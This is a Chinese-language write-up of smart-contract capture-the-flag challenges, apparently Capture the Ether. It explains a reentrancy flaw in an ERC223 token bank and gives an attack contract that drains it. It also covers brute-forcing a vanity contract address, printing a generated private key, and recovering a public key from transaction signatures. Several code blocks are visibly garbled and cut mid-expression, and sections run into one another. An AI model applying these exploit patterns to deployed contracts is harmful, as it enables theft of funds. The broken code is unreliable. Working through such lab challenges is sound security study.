            uint length;
            assembly {
                //retrieve the size of the code on target address, this needs assembly
                length := extcodesize(_addr)
            }
            return length > 0;
        }
        function transfer(address to, uint256 value) public returns (bool success) {
            bytes memory empty;
            return transfer(to, value, empty);
        }
        function transfer(address to, uint256 value, bytes data) public returns (bool) {
            require(balanceOf[msg.sender] >= value);
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
            emit Transfer(msg.sender, to, value);
            if (isContract(to)) {
                ITokenReceiver(to).tokenFallback(msg.sender, value, data);
            }
            return true;
        }
        event Approval(address indexed owner, address indexed spender, uint256 value);
        mapping(address => mapping(address => uint256)) public allowance;
        function approve(address spender, uint256 value)
            public
            returns (bool success)
        {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
            return true;
        }
        function transferFrom(address from, address to, uint256 value)
            public
            returns (bool success)
        {
            require(value  uint256) public balanceOf;
        function TokenBankChallenge(address player) public {
            token = new SimpleERC223Token();
            // Divide up the 1,000,000 tokens, which are all initially assigned to
            // the token contract's creator (this contract).
            balanceOf[msg.sender] = 500000 * 10**18;  // half for me
            balanceOf[player] = 500000 * 10**18;      // half for you
        }
        function isComplete() public view returns (bool) {
            return token.balanceOf(this) == 0;
        }
        function tokenFallback(address from, uint256 value, bytes) public {
            require(msg.sender == address(token));
            require(balanceOf[from] + value >= balanceOf[from]);
            balanceOf[from] += value;
        }
        function withdraw(uint256 amount) public {
            require(balanceOf[msg.sender] >= amount);
            require(token.transfer(msg.sender, amount));
            balanceOf[msg.sender] -= amount;
        }
    }
这道题的质量也非常高，挺有意思的，推荐大家自己去感受一下
挑战给出的合约看起来很长，其实功能还算简单，TokenBankChallenge合约就相对于一个银行，一开始我们我们在里面会有500000
ether的余额，可以通过withdraw来使用这部分余额购买上面SimpleERC223Token合约实现的token，这个银行合约持有的token为1000000
ether，是我们的两倍，看起来挺吓人的，不过这也只是个计量单位，其实合约本身的balance是0，这也是难得的部署挑战时不用我们支付1
ether的合约，毕竟500000 ether也没人拿的出来，我们的目的就是让银行合约持有的token清零
既然要清零我们自然要寻找使得balance减少的地方，在银行合约里显然withdraw函数是切入点，它调用的是token合约的transfer函数，同时我们注意到它是在require里调用的，我想有经验的应该看出来这里存在的问题了，继续将目标转向transfer函数
前面的代码都没什么异常，重点在这一句
    if (isContract(to)) {
                ITokenReceiver(to).tokenFallback(msg.sender, value, data);
            }
这里先是判断了to地址是否是个合约地址，如果是合约的话就用ITokenReceiver接口来调用to合约的tokenFallback函数，在银行合约里这个函数用更改目标的balance，但是to是我们可控的呀，我们只要部署一个攻击合约也命名一个这个函数不就可以成功在transfer的执行过程里额外来调用我们的合约函数么，结合前面看到的require判断里调用的transfer，显然此处是存在重入漏洞的，OK，知道了利用点接下来就很简单了
首先我们需要部署一个攻击合约，然后将我们player的token都转让给这个攻击合约，攻击合约再把token转化为银行的balance，即可以合约身份执行withdraw函数，触发重入，攻击合约如下
    contract Attack {
        address a = address of bankchallenge;
        address b = address of tokencontract;
        TokenBankChallenge target1;
        SimpleERC223Token target2;
        uint256 check;
        function Attack() payable{
            target1= TokenBankChallenge(a);
            target2= SimpleERC223Token(b);
        }
        function action1() public {
            target2.transferFrom(your Account address,address(this),500000000000000000000000);
        }
        function action2() public {
            target2.transfer(a,500000000000000000000000);
        }
        function tokenFallback(address from, uint256 value, bytes) public {
            check=check+1;
            if(check FE8RG!FI;"./+-*!DQ39hsoi@hoFE1F5^7E%&*QS'//生成地址所用的种子
    function fuzz(){
        for(var k=0;k { privateKey:
> ‘0xa376e6c4be605caa488ff90fd81c72a93b7917af0ec8da1c8b46c930246856f5’,  
>  publicKey:
> ‘0xa8e08df06ae686c692b39cde44c9cad07db46afce6a6b0de93390b816a97fb088977715c40426025c4ff0edbf86b9b438fb842095533d5d41210eedcdfe64c73’,  
>  address: ‘0x6C37d4bb51dc59D11aDfA5aA454422944060cfcD’ }  
>  nonce = 6
因为nonce为6所以需要我们在部署攻击合约前先随便发送几个交易，当然，先得把该账户导入我们的metamask，在切换账户处点击import
Account，然后把上面得到的私钥导入即可，然后记得去水龙头取点ether
接下来准备部署我们的攻击合约
    contract attack {
        FuzzyIdentityChallenge fuzz;
        function pwn(){
            fuzz=FuzzyIdentityChallenge(address of your challenge);
            fuzz.authenticate();
        }
        function name() external view returns(bytes32){
            return bytes32("smarx");
        }
    }
先随便发送几个交易，等到第七个交易的时候就可以来部署我们的攻击合约了，因为此时nonce即为6，当然不放心的话也可以提前几个就开始部署，部署完之后看看我们的合约地址是否符合要求，满足要求的话即可调用pwn函数完成挑战了，说实话这个挑战倒是让我感受到了定制化合约地址的玄妙
###  0x2. Public Key
    pragma solidity ^0.4.21;
    contract PublicKeyChallenge {
        address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;
        bool public isComplete;
        function authenticate(bytes publicKey) public {
            require(address(keccak256(publicKey)) == owner);
            isComplete = true;
        }
    }
这个挑战代码倒是挺少的，要求也很简单，给你一个合约的地址，要求你得到该地址的公钥，这里事实上就涉及到以太坊上的公私钥的生成以及对交易进行签名的算法了，篇幅所限这里就不展开讲了，因为内容也太多，下面是一些相关的资料  
[椭圆曲线密码学和以太坊中的椭圆曲线数字签名算法应用](https://blog.csdn.net/teaspring/article/details/77834360)
通过资料我们可以知道在对交易进行签名以后，由于椭圆曲线算法的特性，当知道r、s、v 和
hash时我们是可以计算对应的公钥的，而这些值都可以在交易内进行读取，我们来看看该地址进行过的交易
发现有一个发出的交易，那么我们就可以利用该交易的签名信息得到公钥了，至于r，s，v这些信息我们可以通过web3.eth.getTransaction得到
这里我的计划是利用这些已知的交易信息来使用[ethereumjs-tx](https://github.com/ethereumjs/ethereumjs-tx)库创建一个交易从而利用里面封装的getSenderAddress得到公钥，脚本如下
    const EthereumTx = require('ethereumjs-tx');
    const util = require('ethereumjs-util');
    var rawTx = {
      nonce: '0x00',
      gasPrice: '0x3b9aca00',
      gasLimit: '0x15f90',
      to: '0x6B477781b0e68031109f21887e6B5afEAaEB002b',
      value: '0x00',
      data: '0x5468616e6b732c206d616e21',
      v: '0x29',
      r: '0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7',
      s: '0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962'
    };
    var tx = new EthereumTx(rawTx);
    pubkey=tx.getSenderPublicKey();
    pubkeys=pubkey.toString('hex');
    var address = util.sha3(pubkey).toString('hex').slice(24);
    console.log(pubkeys);
    console.log(address);
运行得到的公钥为
>
> 0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4
提交即可完成挑战
###  0x3. Account Takeover
    pragma solidity ^0.4.21;
    contract AccountTakeoverChallenge {
        address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;
        bool public isComplete;
        function authenticate() public {
            require(msg.sender == owner);
            isComplete = true;
        }
    }
如果有来寻找此题答案的小伙伴可能要失望了，因为这题我也没做，题目的要求是要得到指定账户的私钥，至于线索就得去该地址所进行的各项交易里去寻找了，试了一段时间也没找到诀窍在哪，而且对于这种题目我的兴趣也不是很大，如果有找到了私钥的小伙伴倒也不妨告诉我一声。。。
## 最后
这套题目做下来感觉还是挺有收获的，有很多ethernaut所没有涉及的知识面，也更加贴近实战，希望大家在闯关的过程中也能收获满满，如果有师傅对于其中的关卡有疑问或者对破解私钥那关有想法的话也欢迎联系我，邮箱
[PI:EMAIL](mailto:PI:EMAIL)